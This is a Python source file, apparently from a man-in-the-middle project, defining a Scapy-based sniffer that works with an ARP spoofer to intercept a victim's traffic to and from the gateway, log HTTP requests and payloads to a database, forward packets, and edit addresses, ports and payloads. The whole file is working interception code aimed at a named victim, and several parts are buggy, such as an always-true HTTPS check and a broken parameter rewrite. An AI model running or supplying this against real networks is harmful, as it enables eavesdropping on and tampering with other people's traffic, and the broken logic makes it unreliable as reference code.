from scapy.all import *
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, TCP
from threading import Lock

from scapy.layers.l2 import Ether, getmacbyip

from mitm.arpspoofer import ArpSpoofer
from mitm.database import DataBase


def is_https(pack):
    return TCP in pack and (pack[TCP].sport == 443 or pack[TCP].dport == 443)


def is_http(pack):
    return Raw in pack and TCP in pack and (pack[TCP].sport == 80 or pack[TCP].dport == 80)


class Sniffer:

    def __init__(self, destinationMac, targetIP, gatewayIP, sourceMAC):
        self.spoofer = ArpSpoofer(destinationMac, targetIP, gatewayIP, sourceMAC)
        self.db = DataBase()
        self.packets = self.db.get_last()
        self.db.start()
        self.packets_lock = Lock()

    def start_spoofing(self):
        self.spoofer.start()

    def all_filter(self,packet):
        #return IP in packet and Raw in packet and ((TCP in packet and packet[TCP].sport != 443 and packet[TCP].dport != 443) or (UDP in packet and packet[UDP].dport != 443 and packet[UDP].sport != 443) or (UDP not in packet and TCP not in packet))
        return IP in packet and (DNS in packet or (TCP in packet and (packet[TCP].sport == 80 or packet[TCP].dport == 80) or (UDP in packet and (packet[UDP].sport == 80 or packet[UDP].dport == 80))))

    def sniff_all(self):
        sniff(prn=self.navigate_packets)

    def navigate_packets(self, pack: packet):
        if self.all_filter(pack):
            if self.is_from_victim(pack):
                self.handle_packets_from_victim(pack)
            elif self.is_from_router(pack):
                self.handle_packets_from_router(pack)


    def is_from_router(self, pack):
        return pack[IP].dst == self.spoofer.targetIP and pack[Ether].src == getmacbyip(self.spoofer.gatewayIP)

    def is_from_victim(self,pack):
        return pack[IP].src == self.spoofer.targetIP and pack[Ether].dst == self.spoofer.sourceMAC.replace("-",":").lower()

    def send_packet(self, packet):
        if Ether in packet and IP in packet:
            if self.is_from_victim(packet):
                # is from victim to router
                packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
                #TODO: add changes
            elif self.is_from_router(packet):
                # if from router to victim
                packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
                # TODO: add changes
            else:
                return
            sendp(packet, verbose=False)

    def edit_packet(self, packet, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port, ttl):
        if src_ip != None:
            packet[IP].src = src_ip
        if dst_ip != None:
            packet[IP].dst = dst_ip
        if req_type != None:
            req = self.find_req_type(packet)
            packet[Raw].replace(req, req_type)
        if data != None:
            packet[Raw].load = data
        if req_params != None:
            self.change_req_params(req_params, packet)
        if src_port != None:
            packet[TCP].sport = src_port
        if dst_port != None:
            packet[TCP].dport = dst_port
        if ttl != None:
            packet[IP].ttl = ttl

    def find_req_type(self, packet):
        txt = packet[Raw].load
        list = txt.split()
        return list[0]

    def find_req_param(self, packet):
        try:
            txt = packet[Raw].load
            list = txt.split()
            return list[1]
        except:
            return " "

    def change_req_params(self, req_params, packet):
        txt = packet[Raw].load
        list = txt.split()
        list[1] = req_params
        " ".join(list)
        packet[Raw].load = list

    def handle_https(self, pack):
        pass
        # TODO: handle this

    def handle_dns(self, pack):
        pass
        # TODO: handle this

    def handle_packets_from_victim(self, pack):
        #print("start h/p/v")
        if is_http(pack):
            #self.db = DataBase()
        #try:
            self.db.write_to_victim(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                    self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
            with self.packets_lock:
                self.packets += 1
        elif is_https:
            self.handle_https(pack)
        elif DNS in pack:
            self.handle_dns(pack)

        #except TypeError:
            #print(TypeError)
            #packet.show()

        # fetchall returns list of tupples
        #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)

        #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
         #             "src_port": None, "dst_port": None, "ttl": None}
        #for key in param_dict:
        #    param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
         #   if (param != ''):
          #      param_dict[key] = param
        #self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
         #                param_dict["req_params"], param_dict["data"], param_dict["src_port"], param_dict["dst_port"],
          #               param_dict["ttl"])
        #self.db.write_to_victim_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
         #                               packet[TCP].sport, packet[TCP].dport)
        self.send_packet(pack)

    def handle_packets_from_router(self, pack):
        #print("h/p/r")
        if is_http(pack):
            #self.db = DataBase()
            self.db.write_to_router(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                    self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
            # fetchall returns list of tupples
            #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
            with self.packets_lock:
                self.packets += 1
        elif is_https:
            self.handle_https(pack)
        elif DNS in pack:
            self.handle_dns(pack)
        #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
        #              "src_port": None, "dst_port": None, "ttl": None}
        #for key in param_dict:
        #    param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
        #    if (param != ''):
        #        param_dict[key] = param
        #self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
        #                 param_dict["req_params"],
        #                 param_dict["data"], param_dict["src_port"], param_dict["dst_port"], param_dict["ttl"])
        #self.db.write_to_router_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
        #                                packet[TCP].sport, packet[TCP].dport)
        self.send_packet(pack)
